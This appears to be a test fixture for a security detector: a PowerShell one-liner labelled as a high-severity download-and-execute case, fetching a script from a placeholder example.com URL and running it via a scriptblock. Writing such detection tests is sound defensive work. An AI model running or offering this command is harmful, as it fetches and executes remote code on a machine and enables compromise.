# expect: DlExec/high
# url: https://example.com/d.ps1
& ([scriptblock]::Create((wget https://example.com/d.ps1 -UseBasicParsing).Content))
